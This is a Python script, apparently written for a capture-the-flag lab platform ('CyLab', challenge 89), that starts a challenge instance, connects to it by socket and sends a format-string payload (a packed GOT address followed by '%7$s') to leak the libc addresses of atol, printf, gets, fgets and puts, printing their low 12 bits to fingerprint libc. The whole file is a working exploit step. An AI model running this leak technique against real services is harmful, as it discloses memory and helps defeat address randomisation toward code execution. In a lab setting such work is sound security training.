import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

ANSWER = -2623
GOTS = {"atol": 0x804BFE4, "printf": 0x804BFCC, "gets": 0x804BFD0, "fgets": 0x804BFD4, "puts": 0x804BFE0}
cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass

results = {}
for name, got in GOTS.items():
    s.sendall(f"{ANSWER}\n".encode())
    time.sleep(0.5)
    try:
        s.recv(8192)
    except Exception:
        pass
    s.sendall(struct.pack("<I", got) + b"%7$s" + b"\n")
    time.sleep(0.9)
    res = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            res += c
            if b"guess?" in res:
                break
    except Exception:
        pass
    i = res.find(b"Congrats: ")
    if i >= 0:
        raw = res[i + 10:i + 10 + 8]
        if len(raw) >= 8:
            val = int.from_bytes(raw[4:8], "little")
            results[name] = val
            print(f"{name}: {hex(val)} (low12 0x{val & 0xfff:x})")
s.close()
print("\nrécapitulatif:", {k: hex(v & 0xfff) for k, v in results.items()})
